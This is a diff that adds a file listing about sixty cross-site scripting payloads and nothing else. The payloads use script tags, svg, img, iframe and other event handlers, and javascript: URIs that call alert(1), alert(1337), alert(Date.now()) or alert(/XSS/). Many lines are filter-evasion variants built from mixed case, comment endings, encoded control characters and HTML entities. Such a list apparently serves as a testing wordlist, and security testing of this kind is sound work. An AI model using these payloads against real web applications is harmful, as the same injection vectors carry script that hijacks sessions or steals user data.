@@ -1,0 +1,60 @@
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert(1)</script
+<script>alert(1)</script/>
+<script>alert(1)//</script>
+<script>alert(1)/*</script>
+<script>alert(1)//
+<script>alert(1)%0A</script>
+<script>alert(1)%0D</script>
+<script>alert(1)%09</script>
+<script>alert(1)%0C</script>
+<svg/onload=alert(1)> <svg onload=alert(1)>
+<svg/onload=alert(1)//>
+<svg/onload=alert(1)%0A>
+<svg/onload=alert(1)%0D>
+<svg/onload=alert(1)%09> <img src=x onerror=alert(1)> <img src=x oNeRrOr=alert(1)>
+<img src=x onerror=alert(1)//> <img src=x onerror=alert(1)%0A> <img src=x onerror=alert(1)%09> <img src=x onerror=alert(1)%0D> <img src=x onerror=alert(1)%0C> <img src=x onerror=alert&#40;1&#41;> <img src=x onerror=alert&#x28;1&#x29;> <img src=x onerror=alert%281%29>
+<img src=x onerror=alert/**/(1)>
+<img src=x onerror=alert/*x*/(1)> <img src=x onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img/src=x/onerror=alert(1)//>
+<img/src=x/onerror=alert(1)%0A>
+<iframe src=javascript:alert(1)>
+<iframe src=javascript:alert(1)//>
+<iframe src=javascript:alert(1)%0A>
+<iframe/src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<object data=javascript:alert(1)//>
+<embed src=javascript:alert(1)>
+<embed src=javascript:alert(1)//>
+<a href=javascript:alert(1)>
+<a href=javascript:alert(1)//>
+<a/href=javascript:alert(1)>
+<a/href=javascript:alert(1)//>
+<body onload=alert(1)>
+<body onload=alert(1)//>
+<body/onload=alert(1)>
+<body/onload=alert(1)//>
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert(1)//>
+<textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<details open ontoggle=alert(1)//>
+<marquee onstart=alert(1)>
+<marquee onstart=alert(1)//>
+<video src=x onerror=alert(1)>
+<video src=x onerror=alert(1)//>
+<audio src=x onerror=alert(1)>
+<script>alert(1337)</script>
+<img src=x onerror=alert(1337)>
+<svg onload=alert(1337)>
+<input autofocus onfocus=alert(1337)>
+<details open ontoggle=alert(1337)>
+<marquee onstart=alert(1337)>
+<script>alert(Date.now())</script>
+<img src=x onerror=alert(Date.now())>
+<svg onload=alert(Date.now())>
+<script>alert(/XSS/)</script>
+<img src=x onerror=alert(/XSS/)>
+<svg onload=alert(/XSS/)>
